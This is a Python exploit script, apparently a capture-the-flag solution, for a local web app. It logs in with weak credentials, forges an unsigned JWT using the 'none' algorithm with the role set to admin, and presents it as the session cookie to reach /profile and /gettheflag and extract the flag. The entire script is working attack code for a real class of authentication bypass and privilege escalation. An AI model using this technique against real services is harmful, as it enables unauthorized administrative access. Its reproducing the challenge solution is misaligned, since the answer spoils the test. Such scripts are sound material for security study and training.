import requests
import json
import base64

# Target URL
BASE_URL = "http://127.0.0.1:5003"

# Credentials
USERNAME = "user"
PASSWORD = "user"

def base64url_encode(data):
    """Base64url encode (no padding, URL-safe)"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    elif isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode('utf-8')
    
    # Standard base64 encode
    encoded = base64.urlsafe_b64encode(data).decode('utf-8')
    # Remove padding
    return encoded.rstrip('=')

def craft_unsigned_jwt(username, role):
    """Craft an unsigned JWT with 'none' algorithm"""
    # Header with algorithm 'none'
    header = {
        "alg": "none",
        "typ": "JWT"
    }
    
    # Payload with username and role
    payload = {
        "username": username,
        "role": role
    }
    
    # Base64url encode header and payload
    header_encoded = base64url_encode(header)
    payload_encoded = base64url_encode(payload)
    
    # Create unsigned JWT (ends with a dot, no signature)
    unsigned_jwt = f"{header_encoded}.{payload_encoded}."
    
    return unsigned_jwt

print("[*] Step 1: Login as user:user to verify credentials")
print("=" * 80)

login_data = {
    "username": USERNAME,
    "password": PASSWORD
}

response = requests.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
print(f"[+] POST {BASE_URL}/login")
print(f"[+] Status: {response.status_code}")
print(f"[+] Response: {response.text}")

# Check for session cookie
if response.cookies:
    print(f"[+] Cookies received: {dict(response.cookies)}")

print("\n" + "=" * 80)
print("[*] Step 2: Craft unsigned admin JWT token")
print("=" * 80)

# Craft the unsigned JWT with admin role
admin_jwt = craft_unsigned_jwt("user", "admin")
print(f"[+] Crafted unsigned JWT: {admin_jwt}")

# Decode and display components for verification
parts = admin_jwt.split('.')
header_part = parts[0]
payload_part = parts[1]

# Add padding back for decoding
def add_padding(s):
    return s + '=' * (4 - len(s) % 4)

decoded_header = base64.urlsafe_b64decode(add_padding(header_part)).decode('utf-8')
decoded_payload = base64.urlsafe_b64decode(add_padding(payload_part)).decode('utf-8')

print(f"[+] Header (decoded): {decoded_header}")
print(f"[+] Payload (decoded): {decoded_payload}")
print(f"[+] Signature: (empty)")

print("\n" + "=" * 80)
print("[*] Step 3: Access /profile with admin JWT")
print("=" * 80)

# Set the crafted JWT as session cookie
cookies = {"session": admin_jwt}

response = requests.get(f"{BASE_URL}/profile", cookies=cookies)
print(f"[+] GET {BASE_URL}/profile")
print(f"[+] Status: {response.status_code}")
print(f"[+] Response: {response.text}")

print("\n" + "=" * 80)
print("[*] Step 4: Access /gettheflag with admin JWT to retrieve the flag")
print("=" * 80)

response = requests.get(f"{BASE_URL}/gettheflag", cookies=cookies)
print(f"[+] GET {BASE_URL}/gettheflag")
print(f"[+] Status: {response.status_code}")
print(f"[+] Response: {response.text}")

# Extract and display flag if present
import re
flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
if flag_match:
    flag = flag_match.group(0)
    print("\n" + "=" * 80)
    print("[!] FLAG FOUND!")
    print("=" * 80)
    print(f"[!] {flag}")
    print("=" * 80)
else:
    print("\n[!] No flag found in response")

